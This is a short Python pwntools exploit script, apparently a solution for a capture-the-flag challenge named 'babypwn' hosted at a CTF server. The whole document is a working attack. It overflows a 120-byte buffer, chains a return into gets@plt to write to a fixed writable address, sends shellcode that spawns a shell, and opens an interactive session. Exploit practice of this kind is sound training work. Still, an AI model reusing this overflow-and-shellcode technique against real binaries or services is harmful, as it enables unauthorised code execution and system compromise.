#!/usr/bin/env python3

from pwn import *

exe = ELF("./babypwn")

context.binary = exe


def conn():
        return process([exe.path])


def main():
#    r = conn()
    r = remote("chal.cybersecurityrumble.de", 1990)

    r.recvline()

    exe.address = 0x0000555555554000

    pause()
    
    payload = b"\x00"
    payload += b"M"*(120 - len(payload))
    payload += p64(exe.address + 0x0000000000001523)
    payload += p64(0x5555555580d0)
    payload += p64(exe.plt["gets"])
    payload += p64(0x00005555555580d0)
    r.sendline(payload)

    r.sendline(asm(shellcraft.sh()))

    r.interactive()


if __name__ == "__main__":
    main()
